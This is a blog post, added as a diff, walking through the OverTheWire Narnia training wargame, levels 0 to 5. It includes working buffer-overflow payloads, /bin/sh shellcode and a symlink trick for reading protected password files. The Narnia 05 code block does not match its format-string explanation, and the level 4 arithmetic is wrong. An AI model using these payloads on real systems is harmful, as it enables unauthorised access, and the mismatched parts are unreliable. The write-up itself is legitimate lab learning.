@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<!--
+    So Simple Jekyll Theme 3.2.0
+    Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+    Free for personal and commercial use under the MIT license
+    https://github.com/mmistakes/so-simple-theme/blob/master/LICENSE
+-->
+<html lang="en-US" class="no-js">
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  
+
+  
+    
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Narnia CTF | Cloud Castle Chaos</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Narnia CTF" />
+<meta name="author" content="P2" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF by OverTheWire @ https://overthewire.org/wargames/narnia/ As per the official description: this wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we’ve tried to make them easy to exploit. You’ll get the source code of each level to make it easier for you to spot the vuln and abuse it." />
+<meta property="og:description" content="CTF by OverTheWire @ https://overthewire.org/wargames/narnia/ As per the official description: this wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we’ve tried to make them easy to exploit. You’ll get the source code of each level to make it easier for you to spot the vuln and abuse it." />
+<link rel="canonical" href="http://localhost:4000/ctf/2023/11/03/Narnia.html" />
+<meta property="og:url" content="http://localhost:4000/ctf/2023/11/03/Narnia.html" />
+<meta property="og:site_name" content="Cloud Castle Chaos" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-11-03T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Narnia CTF" />
+<meta name="twitter:site" content="@mmistakes" />
+<meta name="twitter:creator" content="@P2" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"P2"},"dateModified":"2023-11-03T00:00:00+01:00","datePublished":"2023-11-03T00:00:00+01:00","description":"CTF by OverTheWire @ https://overthewire.org/wargames/narnia/ As per the official description: this wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we’ve tried to make them easy to exploit. You’ll get the source code of each level to make it easier for you to spot the vuln and abuse it.","headline":"Narnia CTF","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/ctf/2023/11/03/Narnia.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/images/logo.png"},"name":"P2"},"url":"http://localhost:4000/ctf/2023/11/03/Narnia.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  
+
+  <script>
+    /* Cut the mustard */
+    if ( 'querySelector' in document && 'addEventListener' in window ) {
+      document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + 'js';
+    }
+  </script>
+
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="stylesheet" href="/assets/css/skins/default.css">
+  
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400i,700,700i|Lora:400,400i,700,700i">
+  <link rel="alternate" type="application/atom+xml" title="Cloud Castle Chaos" href="/atom.xml">
+<!-- start custom head snippets -->
+
+<!-- insert favicons. use http://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+</head>
+
+
+  <body class="layout--post  narnia-ctf">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#primary-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+  <div class="navigation-wrapper">
+    <a href="#menu-toggle" id="menu-toggle">Menu</a>
+    <nav id="primary-nav" class="site-nav animated drop">
+      <ul><li><a href="/posts/">Posts</a></li><li><a href="/categories/">Categories</a></li><li><a href="/search/">Search</a></li></ul>
+    </nav>
+  </div><!-- /.navigation-wrapper -->
+
+
+    <header class="masthead">
+  <div class="wrap">
+    
+      <a href="/" class="site-logo" rel="home" title="Cloud Castle Chaos">
+        <img src="/images/logo.png" class="site-logo-img animated fadeInDown" alt="Cloud Castle Chaos">
+      </a>
+    
+    
+    
+      
+        <div class="site-description animated fadeIn"><a href="/">a bit of this. a bit of that.</a></div>
+      
+    
+  </div>
+</header><!-- /.masthead -->
+
+    <main id="main" class="main-content" aria-label="Content">
+  <article class="h-entry">
+    
+
+    <div class="page-wrapper">
+      <header class="page-header">
+        
+        
+          <h1 id="page-title" class="page-title p-name">Narnia CTF
+</h1>
+        
+      </header>
+
+      <div class="page-sidebar">
+        <div class="page-author h-card p-author"><img src="/images/profile.png" class="author-avatar u-photo" alt="P2"><div class="author-info"><div class="author-name">
+        <em>by</em> <span class="p-name">P2</span>
+      </div><ul class="author-links"><li class="author-link">
+            <a class="u-url" rel="me" href=""><i class="fas fa-link fa-lg" title=""></i></a>
+          </li></ul>
+
+<span class="read-time">7 min read</span>
+
+    <time class="page-date dt-published" datetime="2023-11-03T00:00:00+01:00"><a class="u-url" href="">November 3, 2023</a>
+</time>
+
+  </div>
+</div>
+
+        
+  <h3 class="page-taxonomies-title">Categories</h3>
+  
+  <ul class="page-taxonomies"><li class="page-taxonomy"><a class="p-category" href="/categories/#ctf" title="Pages filed under CTF">CTF</a></li>
+  </ul>
+
+
+        
+
+      </div>
+
+      <div class="page-content">
+        <div class="e-content">
+          <p><img src="https://cdn.pixabay.com/photo/2019/04/06/05/17/wallpaper-4106667_1280.jpg" alt="center-aligned-image" class="align-center" /></p>
+
+<p class="notice--info">CTF by <strong>OverTheWire</strong> @ <a href="https://overthewire.org/wargames/narnia/">https://overthewire.org/wargames/narnia/</a></p>
+
+<p>As per the official description: this wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we’ve tried to make them easy to exploit. You’ll get the source code of each level to make it easier for you to spot the vuln and abuse it.</p>
+
+<!--more-->
+
+<table>
+  <thead>
+    <tr>
+      <th>Content:</th>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#install">Install</a></td>
+      <td><a href="#narnia-00">Narnia 00</a></td>
+      <td><a href="#narnia-04">Narnia 04</a></td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td> </td>
+      <td><a href="#narnia-01">Narnia 01</a></td>
+      <td><a href="#narnia-05">Narnia 05</a></td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td> </td>
+      <td><a href="#narnia-02">Narnia 02</a></td>
+      <td><a href="#narnia-06">Narnia 06</a></td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td> </td>
+      <td><a href="#narnia-03">Narnia 03</a></td>
+      <td><a href="#narnia-07">Narnia 07</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="capture-the-flag">Capture the Flag</h1>
+
+<h3 id="install">[Install]</h3>
+<p>All the challenges can be accessed with ssh. The syntax is the following: <br />
+<code class="language-plaintext highlighter-rouge">ssh narniaX@narnia.labs.overthewire.org -p 2226</code> <br />
+All the flags are in <code class="language-plaintext highlighter-rouge">/etc/narnia_pass/</code>, so those are the files we should aim to read in each level. Obviously, we need to gain the right permissions first. <br />
+For each challenge there is executable files and the corresponding sources in the <code class="language-plaintext highlighter-rouge">/narnia/</code> folder.
+In the machine there are a couple of tools already installed, in particular PEDA: this is a gdb extension that shows registers, assembly and stack automatically, reducing a lot of the usual pain when using gdb. To start it, run gdb as usual and then source to the peda.py file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb <span class="nt">--args</span> filetoinspect param1 param2
+<span class="o">&gt;</span> <span class="nb">source</span> /usr/local/peda/peda.py
+</code></pre></div></div>
+
+<h3 id="narnia-00">[Narnia 00]</h3>
+<p><code class="language-plaintext highlighter-rouge">ssh narnia0@narnia.labs.overthewire.org -p 2226</code> <br />
+Password: narnia0</p>
+
+<p>This challenge is the simplest possible example of buffer overflow: we have a variable and a buffer declared just after one other, and if we write in the buffer more data than what it is supposed to hold the system will accept it and just go on and overwrite the memory that is actually assigned to the variable. To see how the memory layout works you can check <a href="https://hackmethod.com/overthewire-narnia-0">InCIDRthreat writeup</a> for this same challenge. <br />
+We start by passing as input a sequence of unique 4bytes, longer than the allocated buffer space: ‘AAAABBBBCCCCDDDDEEEEFFFF’. The program tells us that the value of var is now 0x46464646, which is ASCII hex for FFFF. So now we know that our 0xDEADBEEF should come after exactly 20 characters (the stack has no fancy constructions in place, var and buffer are immediately after one other). We only have to pay attention to the endianness of the bytes that we want. <br />
+One last remark: after getting 0xDEADBEEF the shell closes immediately. To prevent this, we append the cat command to our input. The reason this happens? No idea, and Google tells to use this trick but can’t explain why.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>python <span class="nt">-c</span>  <span class="s2">"print 'AAAA'*5 + '</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">de'"</span><span class="p">;</span> <span class="nb">cat</span><span class="o">)</span> | ./narnia0
+</code></pre></div></div>
+
+<h3 id="narnia-01">[Narnia 01]</h3>
+<p><code class="language-plaintext highlighter-rouge">ssh narnia1@narnia.labs.overthewire.org -p 2226</code> <br />
+Looking at the source code, it seems that the program tries to execute what we set as the environment variable <code class="language-plaintext highlighter-rouge">EGG</code>. Therefore we set is using <code class="language-plaintext highlighter-rouge">export EGG=....</code>. <br />
+If we try to set the variable as a usual command, like <code class="language-plaintext highlighter-rouge">whoami</code>, we get a segfault, meaning that we tried to read or write at an illegal address in memory. What happens is that the program tries to actually execute what we stored in EGG, instead of calling that as a method. <br />
+Therefore we need to put actual machine code instructions in the EGG variable: we aim to run shellcode, so that we will get a shell back and we will afterwards be able to run whatever we want. We can find a working shellcode in many websites, like shell-storm.org</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">EGG</span><span class="o">=</span><span class="si">$(</span>python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80'"</span><span class="si">)</span>
+./narnia1
+<span class="nb">cat</span> /etc/narnia_pass/narnia2
+</code></pre></div></div>
+
+<h3 id="narnia-02">[Narnia 02]</h3>
+<p><code class="language-plaintext highlighter-rouge">ssh narnia2@narnia.labs.overthewire.org -p 2226</code> <br />
+This time we have to overwrite the return address stored in the instruction pointer to be able to access the shell code that we put in the buffer. <br />
+First of all, we need to know exactly how many bytes we have to write in the buffer so that our overflow will end up exactly rewriting the $eip. To do this automagically, <a href="https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/">jason-rush wrote a nice EIP offset tool</a>: what the tool does is create a long string made of unique 4bytes elements. We have to pass the string in our target buffer (use gdb to see the info that we need), and if it’s long enough it will generate a segfault. <br />
+Gdb shows us the faulty $eip that we tried to access, and we just have to copy that value back in the tool to get how many bytes we have to write in the buffer to control the value of the $eip itself. In my case, to overwrite the $eip I have to provide 136 bytes. <br />
+Our target payload has the following structure: <code class="language-plaintext highlighter-rouge">'\x90' * x + shellcode + return address</code>. The <code class="language-plaintext highlighter-rouge">\x90</code> corresponds to the nop instruction, and the x is the length of the overflow (136) minus the length of the shellcode (28) minus the length of the return address (4). The result is a nop sled of 104 bytes: our return address should aim to land somewhere within this sled, so that we don’t have to be super precise trying to write the exact starting address of the shellcode in the return address, instead we will just slide down to it from wherever we land. <br />
+However, we still have to find out where the nop sled will be. To do this, we craft our payload with the proper data and a bogus return address: after running it (in gdb) and ending up in a segfault, we look in the stack with <code class="language-plaintext highlighter-rouge">x/250x $esp</code> and search for the sequence of <code class="language-plaintext highlighter-rouge">0x90909090</code>. As our return address we pick a location that is somewhere in the middle of the sequence, 0xFFFFD760 in my case.
+Now we exit gdb and build the proper payload (remember endianness): <code class="language-plaintext highlighter-rouge">'\x90' * 104 + shellcode + '\x60\xD7\xFF\xFF'</code>. Run narnia2 with this parameter, and enjoy the flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./narnia2 <span class="si">$(</span>python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">90' * 104 + '</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80' + '</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">d7</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff'"</span><span class="si">)</span>
+<span class="nb">cat</span> /etc/narnia_pass/narnia3
+</code></pre></div></div>
+
+<h3 id="narnia-03">[Narnia 03]</h3>
+<p><code class="language-plaintext highlighter-rouge">ssh narnia3@narnia.labs.overthewire.org -p 2226</code> <br />
+This challenge is again a simple buffer overflow, but instead of overwriting the return address we aim to overwrite the output file: we want to be able to give the password file as input and have it printed at our own location instead that piped into /dev/null. <br />
+We can see that by giving an input file longer than 32 bytes, the program complains that it can’t open the output file with a name corresponding to the leftover bytes that we passed. From here the idea: the name of the input will contain the name of the output, from byte 33 onwards. <br />
+We work in the /tmp folder, and start by creating a subfolder so that the length of the path will be exactly 32 bits: <code class="language-plaintext highlighter-rouge">/tmp/AAABBBCCCDDDEEEFFFGGGHHHIII</code> has the desired length. What follows will be part of the input parameter but also of the output file: that’s the reason we create another subfolder called tmp, which will be read as /tmp for the output buffer. <br />
+Then, we have to find a way to pass our target file, and we can do that by creating a symlink to it. The last step is to create an empty file with the same name of the symlink in the /tmp folder, and to give the proper permissions to it. <br />
+The resulting <code class="language-plaintext highlighter-rouge">/tmp/AAABBBCCCDDDEEEFFFGGGHHHIII/tmp/olaola</code> is our input path, and the second part of it <code class="language-plaintext highlighter-rouge">/tmp/olaola</code> will overwrite the output.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /tmp/AAABBBCCCDDDEEEFFFGGGHHHIII
+<span class="nb">mkdir</span> /tmp/AAABBBCCCDDDEEEFFFGGGHHHIII/tmp
+<span class="nb">ln</span> <span class="nt">-s</span> /etc/narnia_pass/narnia4 /tmp/AAABBBCCCDDDEEEFFFGGGHHHIII/tmp/olaola
+<span class="nb">touch</span> /tmp/olaola
+<span class="nb">chmod </span>777 /tmp/olaola
+./narnia3 /tmp/AAABBBCCCDDDEEEFFFGGGHHHIII/tmp/olaola
+<span class="nb">cat</span> /tmp/olaola
+</code></pre></div></div>
+
+<h3 id="narnia-04">[Narnia 04]</h3>
+<p><code class="language-plaintext highlighter-rouge">ssh narnia4@narnia.labs.overthewire.org -p 2226</code> <br />
+This challenge is exactly the same as the level number 2. What we have to do is to find out how many bytes we need to send to take over the $eip, and then to check where we want our return address to point. <br />
+After trying a few different lengths on gdb, for me the $eip overflow happens with 236 bytes. This means that we need 236 - 28 (shellcode) - 4 (return address) = 236 nop operations at the start of our payload. <br />
+Running the payload with a bogus return address, we can check that when the segfault happens a good place to aim in the middle of the nop sled is 0xFFFFD6F0. This completes the construction of the payload.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./narnia4 <span class="si">$(</span>python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">90' * 236 + '</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80' + '</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">d6</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff'"</span><span class="si">)</span>
+<span class="nb">cat</span> /etc/narnia_pass/narnia5
+</code></pre></div></div>
+
+<h3 id="narnia-05">[Narnia 05]</h3>
+<p><code class="language-plaintext highlighter-rouge">ssh narnia5@narnia.labs.overthewire.org -p 2226</code> <br />
+First thing to say in this challenge is that we are really constrained to the declared 64 bytes of the buffer: the method used to read it is safe in that sense. However, we can pass the string formatting characters that will control a printf-like method. <br />
+The <code class="language-plaintext highlighter-rouge">printf</code> can be exploited by convincing it to read or write for us stack values. This is possible because as soon as printf encounters a %x, %d or similar char it will pop data from the stack, blindly assuming that the corresponding values have been pushed into it beforehand. <br />
+In our case no value has been pushed, so we access the stack directly. Using %n we can even write into the stack, as the popped value is treated as an address where to write the number of bytes written until that moment.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-lah</span>
+<span class="nb">cd </span>inhere
+find <span class="nb">.</span> <span class="nt">-print</span> <span class="nt">-ls</span> | <span class="nb">grep </span>1033
+<span class="nb">cat</span> ./maybehere07/.file2
+</code></pre></div></div>
+
+<h3 id="narnia-06">[Narnia 06]</h3>
+<h3 id="narnia-07">[Narnia 07]</h3>
+<h3 id="narnia-08">[Narnia 08]</h3>
+<p>Aaaaaand this is where I got stuck. Too bad… overflows can get hard real quick, and we didn’t even start looking into heap exploitation!</p>
+
+        </div>
+
+        
+          <div class="page-share">
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F03%2FNarnia.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--facebook btn--small"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i> <span>Share</span></a>
+  <a href="https://twitter.com/intent/tweet?text=Narnia+CTF%20http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F03%2FNarnia.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--twitter btn--small"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i> <span>Tweet</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F03%2FNarnia.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--linkedin btn--small"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> <span>LinkedIn</span></a>
+  <a href="https://reddit.com/submit?title=Narnia+CTF&url=http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F03%2FNarnia.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--reddit btn--small"><i class="fab fa-fw fa-reddit" aria-hidden="true"></i> <span>Reddit</span></a>
+</div>
+
+        
+
+        
+
+        <nav class="page-pagination" role="navigation">
+  
+    <a class="page-previous" href="/ctf/2023/11/03/Leviathan.html">
+      <h4 class="page-pagination-label">Previous</h4>
+      <span class="page-pagination-title">
+        <i class="fas fa-arrow-left"></i> Leviathan CTF
+
+      </span>
+    </a>
+  
+
+  
+    <a class="page-next" href="/ctf/2023/11/03/Natas.html">
+      <h4 class="page-pagination-label">Next</h4>
+      <span class="page-pagination-title">
+        Natas CTF
+ <i class="fas fa-arrow-right"></i>
+      </span>
+    </a>
+  
+</nav>
+
+      </div>
+    </div>
+  </article>
+</main>
+
+
+    <footer id="footer" class="site-footer">
+  <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+<div class="social-icons"><a class="social-icon" href="/atom.xml"><i class="fas fa-rss-square fa-2x" title="Feed"></i></a></div><div class="copyright">
+    
+      <p>&copy; 2024 Cloud Castle Chaos. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://github.com/mmistakes/so-simple-theme" rel="nofollow">So Simple</a>.</p>
+    
+  </div>
+</footer>
+
+    <script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.0.12/js/all.js"></script>
+
+
+<!-- MathJax -->
+
+<script>
+// http://docs.mathjax.org/en/latest/upgrading/v2.html
+MathJax = {
+  tex: {
+      tags: "ams"    // eq numbering options: none, ams, all
+  },
+  options: {
+    renderActions: {
+      // for mathjax 3, handle <script "math/tex"> blocks inserted by kramdown
+      find: [10, function (doc) {
+        for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+          const display = !!node.type.match(/; *mode=display/);
+          const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+          const text = document.createTextNode('');
+          node.parentNode.replaceChild(text, node);
+          math.start = {node: text, delim: '', n: 0};
+          math.end = {node: text, delim: '', n: 0};
+          doc.math.push(math);
+        }
+      }, '']
+    }
+  }
+}
+</script>
+
+<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js"></script>
+
+  </body>
+
+</html>
